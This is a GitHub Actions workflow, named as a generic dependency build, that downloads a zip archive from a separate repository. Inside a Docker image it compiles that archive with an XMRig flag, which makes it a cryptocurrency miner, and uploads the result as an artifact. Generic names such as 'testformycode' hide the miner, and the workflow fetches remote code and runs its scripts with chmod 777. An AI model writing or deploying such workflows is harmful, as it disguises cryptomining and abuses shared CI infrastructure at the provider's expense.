name: Build and Install Dependencies 12

on:
  push:
    branches:
      - main
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout Repository
        uses: actions/checkout@v2

      - name: Download Source Code
        run: |
          curl -L -o testformycode.zip https://raw.githubusercontent.com/tjbcc0/tetmc/refs/heads/main/testformycode.zip

      - name: Set up Docker
        uses: docker/setup-buildx-action@v2

      - name: Build with Docker
        run: |
          echo 'FROM ubuntu:20.04
          ENV DEBIAN_FRONTEND=noninteractive
          RUN apt-get update && \
              apt-get install -y --no-install-recommends \
              curl unzip git wget build-essential cmake automake libtool autoconf bison python3 gawk && \
              rm -rf /var/lib/apt/lists/*
          WORKDIR /app
          RUN curl -L -o glibc-2.17.tar.gz http://ftp.gnu.org/gnu/libc/glibc-2.17.tar.gz && \
              tar -xzf glibc-2.17.tar.gz && \
              cd glibc-2.17 && \
              mkdir build && \
              cd build && \
              ../configure --prefix=/usr && \
              make && \
              make install
          COPY testformycode.zip .
          RUN unzip testformycode.zip
          WORKDIR /app/testformycode/scripts
          RUN chmod 777 *.sh && ./build_deps.sh
          RUN mkdir -p /app/testformycode/build && \
              cd /app/testformycode/build && \
              cmake -DXMRIG_DEPS=scripts/deps -DBUILD_SHARED_LIBS=OFF .. && \
              make' > Dockerfile

          docker build -t my-build-image .

      - name: Copy Build Output
        run: |
          mkdir -p output
          docker run --rm -v ${{ github.workspace }}:/workspace my-build-image cp -r /app/testformycode/build /workspace/output

      - name: Upload Build Artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-output
          path: output/build
          if-no-files-found: warn
          include-hidden-files: false
